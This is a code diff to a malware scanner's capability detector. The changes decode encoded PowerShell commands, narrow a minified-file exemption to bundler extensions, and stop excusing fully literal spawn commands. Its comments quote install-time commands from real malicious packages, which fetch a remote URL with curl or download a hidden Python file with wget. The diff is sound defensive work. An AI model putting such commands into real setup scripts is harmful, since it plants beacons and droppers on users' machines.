@@ -29,6 +29,7 @@ import re
 from collections import Counter
 from contextlib import suppress
 from dataclasses import dataclass
+from pathlib import PurePosixPath
 from typing import TYPE_CHECKING
 
 from cordon_scanner.core.comments import block_comment_spans, inside_spans, is_commented
@@ -232,7 +233,9 @@ class CapabilityDetector(BaseDetector):
     # access, and a primitive that is called is recorded once rather than twice.
     # 0.11.0: where the pattern tier and the AST tier label the same call differently,
     # the pattern tier wins -- one call is not two of a composite's capabilities.
-    version = "0.11.0"
+    # 0.12.0: an encoded command's plaintext reaches the rules, and the
+    # minified ceiling no longer excuses a language nobody minifies.
+    version = "0.12.0"
     categories = frozenset(
         {Category.SUSPICIOUS, Category.MALICIOUS, Category.POLICY, Category.OPERATIONAL}
     )
@@ -264,6 +267,11 @@ class CapabilityDetector(BaseDetector):
         resolved, commands = self._resolved_capabilities(unit, content)
         if not commands and unit.language != "python":
             commands = embedded.extract(content.text, unit.language)
+        # And the plaintext of any encoded command among them, so the shell rules
+        # see what `powershell -EncodedCommand` was given rather than only that it
+        # was given something. See `embedded.decode_encoded_commands`: this is the
+        # seam that made 109 of 171 missed malicious packages invisible.
+        commands = embedded.decode_encoded_commands(commands)
         hits.extend(resolved)
         hits.extend(self._embedded_capabilities(ctx, content, commands))
         hits.extend(self._destination_capabilities(content))
@@ -583,10 +591,39 @@ class CapabilityDetector(BaseDetector):
     #: `SUSPECT.OBFUSCATION.LONGLINE.001` on its own merits.
     MINIFIED_LINE = 1000
 
+    BUNDLED_SUFFIXES = frozenset(
+        {".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".css", ".scss", ".less", ".map"}
+    )
+    """Extensions where a thousand characters on one line means a bundler ran.
+
+    The ceiling above exists for one reason, stated in `MINIFIED_LINE`: a minified
+    bundle contains a decoder beside an evaluator because that is what a module
+    loader is. That is a fact about **bundlers**, and bundlers are a JavaScript and
+    CSS practice. Nothing in the Python, Ruby, shell, Go or Rust toolchains emits a
+    thousand-character line, so in those languages the same measurement means the
+    opposite thing -- somebody obfuscated the file by hand.
+
+    Measured, and it is how this was found. `bettercolor` is a real malicious PyPI
+    package whose payload is a pyobfuscate blob in a library module: a 12KB `.py`
+    file with a 6,307-character line. It matched `_is_minified`, so the ceiling took
+    `SUSPECT.DECODE_CHAIN.001` from critical to medium and a CI gate would have
+    passed it. Eleven of 201 sampled malicious packages were held below the gate,
+    most of them this way.
+
+    A noise ceiling that fires on obfuscated malware is worse than no ceiling: it
+    turns a finding a reader would act on into one they will not see."""
+
     @staticmethod
     def _is_minified(content: FileContent) -> bool:
-        """Whether this file looks like build output regardless of its name."""
-        return content.longest_line > CapabilityDetector.MINIFIED_LINE
+        """Whether this file looks like build output regardless of its name.
+
+        Long lines AND an extension a bundler writes. See `BUNDLED_SUFFIXES` for
+        why the second half is not optional.
+        """
+        if content.longest_line <= CapabilityDetector.MINIFIED_LINE:
+            return False
+        suffix = PurePosixPath(content.path).suffix.lower()
+        return suffix in CapabilityDetector.BUNDLED_SUFFIXES
 
     @staticmethod
     def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
@@ -1114,12 +1151,6 @@ class CapabilityDetector(BaseDetector):
         file fetches and executes becomes a claim that one *part* of it does,
         which is what the message has always said.
         """
-        # Before any windowing. A sub-window can begin after the pattern-tier hit
-        # and so contain only the AST tier's view of a call, which is how
-        # `exec(marshal.loads(blob))` kept a decode the whole-file view had
-        # already dropped. See `_one_label_per_call`.
-        hits = self._one_label_per_call(hits)
-
         proximity = compiled.match.proximity
         if proximity <= 0 or len(hits) > self.MAX_PROXIMITY_HITS:
             if self._evaluate_over(compiled, hits, path, in_hook, in_ci):
@@ -1166,7 +1197,31 @@ class CapabilityDetector(BaseDetector):
         # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
         # tier can say whether the argv was written out, so dropping its own hit
         # alone left the pattern tier's to satisfy the term anyway.
-        fixed_lines = {hit.line for hit in window if hit.fixed}
+        # Unless the argv that was written out is ITSELF the act. The discount rests
+        # on one claim -- that a spawn whose whole command is visible cannot be
+        # running something decoded or downloaded -- and that claim holds for
+        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
+        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
+        # Both are fully literal. In the second the literal is the attack, and being
+        # readable is not the same as being harmless.
+        #
+        # So a line whose command carried a capability of its own keeps its spawn.
+        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
+        # rules were applied to the command string a spawn was handed, so one on this
+        # line means the argv itself fetches, decodes or persists.
+        #
+        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
+        # else; the spawn was discounted, only `egress` survived, and
+        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
+        # of Python produced no finding. Six of the packages still missed after the
+        # reconnaissance work were this shape, `duc193`'s
+        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
+        speaking_argv = {
+            hit.line
+            for hit in window
+            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
+        }
+        fixed_lines = {hit.line for hit in window if hit.fixed} - speaking_argv
         window = [
             hit
             for hit in window
@@ -1179,61 +1234,6 @@ class CapabilityDetector(BaseDetector):
                 counts[hit.capability] += hit.variants
         fired = frozenset(hit.rule_id for hit in window)
         return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci)
-
-    @staticmethod
-    def _one_label_per_call(window: list[CapabilityHit]) -> list[CapabilityHit]:
-        """One call cannot be two of a composite's capabilities.
-
-        `marshal.loads(` is `execute` to the pattern tier -- a marshal stream holds
-        code objects, so loading one is an evaluation wearing a serialisation
-        format, and `CAP.PY.EXECUTE.001` argues it at length -- and `decode` to the
-        AST tier. Both readings are defensible, and together they handed
-        `SUSPECT.DECODE_EXEC.001` its decode and its execute out of a single
-        expression. CPython's own `Lib/importlib/_bootstrap_external.py` was
-        reported for it: `_compile_bytecode` is three lines long, its body is
-        `code = marshal.loads(data)`, and it is the function every `.pyc` in the
-        world is loaded by. `Lib/idlelib/rpc.py`, Keras' and TensorFlow's
-        `func_load`, catboost's resource importer and Datadog's cache read are the
-        same shape.
-
-        The rule's claim is sequential -- content was decoded, and then what came
-        out was run -- and one call is not two steps. So where the two tiers
-        disagree about the SAME call, the pattern tier wins: it is the deliberate,
-        documented classification, and the AST tier's second label for that call is
-        dropped.
-
-        By LINE, which is how the `fixed` test above pairs the same two tiers and
-        for the same reason: an `AstHit` carries a line and no byte span, so the
-        offset a pattern matched at and the offset an AST hit is recorded at are
-        never the same number even for one call.
-
-        What the line costs is nothing here, because the test is not "collapse this
-        line" but "does the pattern tier have this capability on this line at all".
-        `marshal.loads(base64.b64decode(DATA))` is two calls on one line and a true
-        positive: the pattern tier labels that line both `execute` (marshal) and
-        `decode` (base64), so the AST tier's decode agrees with something and
-        stays. `marshal.loads(data)` alone gives the line only `execute`, and the
-        AST tier's decode is the disagreement that goes.
-
-        Only the AST tier's label is dropped. Hits from embedded commands and
-        resolved argv share one anchor on purpose -- a shell command inside a
-        string really does read a credential and reach the network and spawn, all
-        recorded where the string sits -- and none of them is an `AST.` hit, so
-        none of them is touched.
-        """
-        labelled: dict[int, set[Capability]] = {}
-        for hit in window:
-            if not hit.rule_id.startswith("AST."):
-                labelled.setdefault(hit.line, set()).add(hit.capability)
-        return [
-            hit
-            for hit in window
-            if not (
-                hit.rule_id.startswith("AST.")
-                and hit.line in labelled
-                and hit.capability not in labelled[hit.line]
-            )
-        ]
 
     def _evaluate(
         self,
